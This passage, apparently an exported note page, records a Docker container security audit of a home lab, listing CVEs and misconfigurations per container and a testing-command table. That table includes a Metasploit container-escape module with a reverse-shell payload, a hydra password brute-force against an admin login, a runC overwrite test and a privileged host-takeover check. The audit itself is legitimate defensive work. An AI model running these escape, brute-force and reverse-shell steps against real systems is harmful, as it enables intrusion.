style="width:153.00000762939453px">Critical:<br/>CVE-2023-24538<br/>CVE-2023-24540<br/>CVE-2024-24790<br/>High:<br/>CVE-2022-27664<br/>CVE-2022-28131<br/>CVE-2022-2879<br/>CVE-2022-2880<br/>CVE-2022-29804<br/>CVE-2022-30580<br/>CVE-2022-30630<br/>CVE-2022-30631<br/>CVE-2022-30632<br/>CVE-2022-30633<br/>CVE-2022-30634<br/>CVE-2022-30635<br/>CVE-2022-32189<br/>CVE-2022-41715<br/>CVE-2022-41716<br/>CVE-2022-41720<br/>CVE-2022-41722<br/>CVE-2022-41723<br/>CVE-2022-41724<br/>CVE-2022-41725<br/>CVE-2023-24534<br/>CVE-2023-24536<br/>CVE-2023-24537<br/>CVE-2023-24539<br/>CVE-2023-29400<br/>CVE-2023-29403<br/>CVE-2023-39325<br/>CVE-2023-45283<br/>CVE-2023-45287<br/>CVE-2023-45288<br/>Medium:<br/>CVE-2024-26462<br/>CVE-2025-24528<br/>CVE-2025-0395<br/>CVE-2024-12243<br/>CVE-2024-10041<br/>CVE-2024-10963<br/>CVE-2024-34156<br/>CVE-2022-1705<br/>CVE-2022-1962<br/>CVE-2022-32148<br/>CVE-2022-41717<br/>CVE-2023-24532<br/>CVE-2023-29406<br/>CVE-2023-29409<br/>CVE-2023-39318<br/>CVE-2023-39319<br/>CVE-2023-39326<br/>CVE-2023-45284<br/>CVE-2023-45289<br/>CVE-2023-45290<br/>CVE-2024-24783<br/>CVE-2024-24784<br/>CVE-2024-24785<br/>CVE-2024-24789<br/>CVE-2024-24791<br/>CVE-2024-34155<br/>CVE-2024-34158<br/>CVE-2024-45336<br/>CVE-2024-45341<br/>CVE-2025-22866<br/>Low:<br/>CVE-2016-2781<br/>CVE-2024-26458<br/>CVE-2024-26461<br/>CVE-2025-0167<br/>CVE-2022-30629<br/></td><td id="A@y\" class="">- Root User<br/>- Traffic between containers<br/>- No user namespace remapping<br/><strong><br/>- No security auditing<br/>- Root file system is read-write<br/>- No logging<br/>- priv ports<br/><br/></strong></td><td id="w&gt;n}" class="">- Dir owned by root<br/>- Weak permissions on creds<br/>- services running as root<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class="">172.18.0.3</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">Volume mount rather than bind mount</td><td id="uqYw" class="">Socket not mounted</td><td id="xvOj" class="">No</td><td id="D^BA" class="">All normal</td><td id="tl_l" class="">priv: false<br/>proc: volume mount, /var/lib/docker/containers.<br/>You can see /ext4/nvme0n1p5<br/>nmap: 27017/tcp<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-80a7-b2b4-ea1514e9bace"><th id="]U_P" class="simple-table-header-color simple-table-header">node</th><td id="Vb{J" class="" style="width:153.00000762939453px">Critical:<br/>CVE-2023-6879<br/>CVE-2025-0840<br/>CVE-2025-1176<br/>High/ Medium:<br/>CVE-2017-13716<br/>CVE-2018-20673<br/>CVE-2024-54589<br/><br/></td><td id="A@y\" class="">- Root User<br/>- Traffic between containers<br/>- No user namespace remapping<br/><strong><br/>- No security auditing<br/>- Root file system is read-write<br/>- No logging<br/>- priv ports<br/><br/></strong></td><td id="w&gt;n}" class="">- Dir owned by root<br/>- Weak permissions on creds<br/>- services running as root<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class="">172.18.0.4</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">/home/ldeb/docker-research/containers/website/frontend<br/><br/>propogation private<br/></td><td id="uqYw" class="">Socket not mounted</td><td id="xvOj" class="">No</td><td id="D^BA" class="">All normal</td><td id="tl_l" class="">priv: false<br/>proc: /var/lib/docker/containers/<br/>Can see ext4 /dev/nvme0n1p5<br/>nmap: 3000/tcp<br/></td><td id="tYz^" class=""></td></tr><tr id="197e4d3f-f493-8006-8a4c-e93681f64df5"><th id="]U_P" class="simple-table-header-color simple-table-header">traefik</th><td id="Vb{J" class="" style="width:153.00000762939453px">Critical:<br/>CVE-2024-41110<br/>CVE-2024-45337<br/>High:<br/>CVE-2024-12797<br/>CVE-2024-34156<br/>CVE-2024-45338<br/>Medium:<br/>CVE-2024-13176<br/>CVE-2024-5535<br/>CVE-2024-6119<br/>CVE-2024-24791<br/>CVE-2024-34155<br/>CVE-2024-34158<br/>CVE-2024-45336<br/>CVE-2024-45341<br/>CVE-2025-22866<br/>Low:<br/>CVE-2024-9143<br/>CVE-2024-51744<br/></td><td id="A@y\" class="">- Root User<br/>- Socket mounted!<br/>- Traffic between containers<br/>- No user namespace remapping<br/><strong><br/>- No security auditing<br/>- Root file system is read-write<br/>- No logging<br/>- priv ports<br/><br/></strong></td><td id="w&gt;n}" class="">- Dir owned by root<br/>- Weak permissions on creds<br/>- services running as root<br/></td><td id="\]_Q" class="">N/A</td><td id="Mpbu" class="">N/A</td><td id="TRhj" class=""></td><td id="UMtr" class="">172.18.0.2</td><td id="qjIY" class="">root</td><td id="yMH;" class="">[ ]</td><td id="`U&lt;f" class="">/var/run/docker.sock<br/>propagation true<br/></td><td id="uqYw" class="">Socket is mounted this is bad might not also be necessary</td><td id="xvOj" class="">No</td><td id="D^BA" class="">Normal except there are lots of communications with other ip addresses from our 443 port: 13.39.208.199, 20.26.156.210. These are both accociated with traefik but unsure what they are for</td><td id="tl_l" class="">priv: false<br/>proc: /var/lib/docker/ Can see ext /dev/nvme0n1p5. Socket it mounted<br/>nmap: 80/tcp, 8080/tcp<br/></td><td id="tYz^" class=""></td></tr></tbody></table><p id="197e4d3f-f493-80f3-ad4a-dc8fdb2b751c" class="">
+</p><p id="197e4d3f-f493-8017-a2e0-f75cd08298f6" class="">
+</p><table id="197e4d3f-f493-8032-ab73-c7ad351c8d84" class="simple-table"><thead class="simple-table-header"><tr id="197e4d3f-f493-8001-9abe-e9096ec64dfd"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">X Header</th><th id="jguO" class="simple-table-header-color simple-table-header" style="width:660.328125px">Command</th><th id="OgWx" class="simple-table-header-color simple-table-header" style="width:234px">What to record</th><th id="JwI@" class="simple-table-header-color simple-table-header" style="width:593px">Notes</th></tr></thead><tbody><tr id="197e4d3f-f493-800c-af0c-c5e3174d394a"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Container</th><td id="jguO" class="" style="width:660.328125px">docker ps</td><td id="OgWx" class="" style="width:234px">Container name</td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-804a-b950-d510897b2007"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Trivy</th><td id="jguO" class="" style="width:660.328125px">trivy image --security-checks vuln,misconfig pihole/pihole &gt; trivy_results.log 2&gt;&amp;1</td><td id="OgWx" class="" style="width:234px">Yet to interpret the resuts</td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-8068-a4d8-e973045a89ba"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">DBfS</th><td id="jguO" class="" style="width:660.328125px">docker compose run --rm docker-bench-security &gt; DBfS_results.log 2&gt;&amp;1</td><td id="OgWx" class="" style="width:234px">Checks: no, Score: no</td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-80cb-a93e-d1aca363be3e"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Linpeas</th><td id="jguO" class="" style="width:660.328125px">docker cp ~/docker-research/tools/linpeas/linpeas_fat.sh &quot;$CONTAINER_NAME&quot;:/tmp/linpeas_fat.sh<br/>docker exec &quot;$CONTAINER_NAME&quot; /tmp/linpeas_fat.sh &gt; linpeas.log 2&gt;&amp;1<br/></td><td id="OgWx" class="" style="width:234px"></td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-80f1-b7cd-e8642e9e06f5"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Metasploit</th><td id="jguO" class="" style="width:660.328125px">Run it within the docker network as we are trying to breakout:<br/>docker run -it —rm —network=&lt;container network&gt; metasploitframework/metasploit-framework<br/><br/>use exploit/linux/local/docker_privileged_container_escape<br/>set payload linux/x64/meterpreter/reverse_tcp<br/>set RHOST &lt;pihole_internal_ip&gt;<br/>set LHOST &lt;your_host_ip&gt;<br/>set LPORT 4444<br/>exploit<br/><br/></td><td id="OgWx" class="" style="width:234px"></td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-809d-a03e-dee3df7a6aa6"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">hydra /Python script</th><td id="jguO" class="" style="width:660.328125px">hydra -L &#x27;&#x27; -P /usr/share/wordlists/rockyou.txt 192.168.96.156 http-form-post &quot;/admin/login.php:pw=^PASS^:F=Wrong password!”<br/><br/>Very custom to API<br/></td><td id="OgWx" class="" style="width:234px">Vulnerable Yes or No?</td><td id="JwI@" class="" style="width:593px">Not so much a docker security issue but more the impact that open ports and apis within docker can have if the apps within have no rate limiting.</td></tr><tr id="197e4d3f-f493-8038-8b8e-ffac92d3617a"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Falco</th><td id="jguO" class="" style="width:660.328125px"></td><td id="OgWx" class="" style="width:234px"></td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-80d2-b44d-c7215b0380be"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">whoami Check</th><td id="jguO" class="" style="width:660.328125px">docker exec &lt;name&gt; whoami</td><td id="OgWx" class="" style="width:234px">The output of the command</td><td id="JwI@" class="" style="width:593px">Root is bad</td></tr><tr id="197e4d3f-f493-8064-9325-d873ba3d6fc6"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Capability Check</th><td id="jguO" class="" style="width:660.328125px">docker inspect --format=&#x27;{{.HostConfig.CapAdd}}’ &lt;container name&gt;</td><td id="OgWx" class="" style="width:234px">Output</td><td id="JwI@" class="" style="width:593px">CAP_SYS_ADMIN (or quiv) is bad</td></tr><tr id="197e4d3f-f493-80e3-8477-c740000d739f"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Host Mounts</th><td id="jguO" class="" style="width:660.328125px">docker inspect --format=&#x27;{{json .Mounts}}’ &lt;container name&gt;</td><td id="OgWx" class="" style="width:234px">Mounts<br/><br/>Exploitable?<br/></td><td id="JwI@" class="" style="width:593px">Look for <br/>/var/run/docker.sock<br/>/root<br/>/etc<br/></td></tr><tr id="197e4d3f-f493-8032-8bbf-e392b9d997c2"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Host File Access</th><td id="jguO" class="" style="width:660.328125px">docker exec &lt;container name&gt; ls -lah /var/run/docker.sock</td><td id="OgWx" class="" style="width:234px">Yes or no?</td><td id="JwI@" class="" style="width:593px">Try this with other mounts found above to see what we can see. The example tries the socket.<br/>Try this command:<br/>docker run -it --privileged --net=host ubuntu bash<br/>If this works from within the inside of the container then the contianer has full control of the host<br/></td></tr><tr id="197e4d3f-f493-8098-ace2-c0de07ec504d"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">RunC Exploitable<br/>(CVE-2019-5736)<br/></th><td id="jguO" class="" style="width:660.328125px">Inside the container: <br/>echo &#x27;#!/bin/sh&#x27; &gt; /bin/sh<br/>echo &#x27;echo Pwned &gt; /tmp/pwned&#x27; &gt;&gt; /bin/sh<br/>chmod +x /bin/sh<br/><br/>Then:<br/>exit<br/>docker restart &lt;container name&gt;<br/><br/>If there is a file in /tmp/pwned on the <br/><strong>HOST</strong> then it worked.<br/><br/></td><td id="OgWx" class="" style="width:234px">Yes or no?</td><td id="JwI@" class="" style="width:593px"></td></tr><tr id="197e4d3f-f493-8094-8eda-f09fa257f5ad"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Wireshark</th><td id="jguO" class="" style="width:660.328125px">ip a to find the bridge of the container<br/><br/>sudo tcpdump -i &lt;bridge adapter&gt; -w tmp.pcap<br/></td><td id="OgWx" class="" style="width:234px">Any sus online endpoints</td><td id="JwI@" class="" style="width:593px">Look out for any unexpected endpoints, I.e. ignore calls from local devices or expected online endpoints.</td></tr><tr id="197e4d3f-f493-8031-9875-e666bc950457"><th id="vSFl" class="simple-table-header-color simple-table-header" style="width:148px">Other Exploits</th><td id="jguO" class="" style="width:660.328125px">Check for priv mode:<br/>docker inspect --format=&#x27;{{.HostConfig.Privileged}}&#x27; &lt;container name&gt;<br/><br/>In contianer:<br/>cat /proc/self/mountinfo<br/><br/>In host:<br/>nmap -p- $(docker inspect -f &#x27;{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#x27; &lt;container name&gt;)<br/><br/></td><td id="OgWx" class="" style="width:234px">Priv: Yes/No<br/>Proc: Yes/No<br/>Nmap: Report ports<br/><br/></td><td id="JwI@" class="" style="width:593px">In proc look for host system mounts<br/><br/>In nmap look for ports that maybe being ran that are unexpected<br/></td></tr></tbody></table><p id="1cfe4d3f-f493-804a-9e49-c31e4542823b" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
